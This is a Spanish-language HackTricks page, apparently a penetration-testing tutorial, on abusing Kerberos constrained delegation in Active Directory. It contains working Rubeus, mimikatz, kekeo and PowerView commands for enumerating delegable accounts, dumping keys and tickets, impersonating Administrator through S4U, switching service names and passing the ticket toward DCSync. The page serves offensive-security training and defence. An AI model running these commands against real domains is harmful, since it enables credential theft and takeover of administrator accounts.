# Delegación Constrainada

{{#include ../../banners/hacktricks-training.md}}

## Delegación Constrainada

Usando esto, un administrador de dominio puede **permitir** que una computadora **suplante a un usuario o computadora** contra cualquier **servicio** de una máquina.

- **Servicio para Usuario a sí mismo (_S4U2self_):** Si una **cuenta de servicio** tiene un valor de _userAccountControl_ que contiene [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), entonces puede obtener un TGS para sí misma (el servicio) en nombre de cualquier otro usuario.
- **Servicio para Usuario a Proxy (_S4U2proxy_):** Una **cuenta de servicio** podría obtener un TGS en nombre de cualquier usuario al servicio establecido en **msDS-AllowedToDelegateTo.** Para hacerlo, primero necesita un TGS de ese usuario a sí misma, pero puede usar S4U2self para obtener ese TGS antes de solicitar el otro.

**Nota**: Si un usuario está marcado como ‘_La cuenta es sensible y no puede ser delegada_’ en AD, **no podrás suplantarlo**.

Esto significa que si **comprometes el hash del servicio** puedes **suplantar usuarios** y obtener **acceso** en su nombre a cualquier **servicio** sobre las máquinas indicadas (posible **privesc**).

Además, **no solo tendrás acceso al servicio que el usuario puede suplantar, sino también a cualquier servicio** porque el SPN (el nombre del servicio solicitado) no está siendo verificado (en el ticket esta parte no está encriptada/firmada). Por lo tanto, si tienes acceso al **servicio CIFS** también puedes tener acceso al **servicio HOST** usando la bandera `/altservice` en Rubeus, por ejemplo.

Además, el **acceso al servicio LDAP en DC** es lo que se necesita para explotar un **DCSync**.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
- Paso 1: **Obtener TGT del servicio permitido**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Existen **otras formas de obtener un ticket TGT** o el **RC4** o **AES256** sin ser SYSTEM en la computadora, como el Printer Bug y la delegación no restringida, el relé NTLM y el abuso del Servicio de Certificados de Active Directory.
>
> **Con solo tener ese ticket TGT (o hash) puedes realizar este ataque sin comprometer toda la computadora.**

- Step2: **Obtener TGS para el servicio impersonando al usuario**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Más información en ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)

{{#include ../../banners/hacktricks-training.md}}
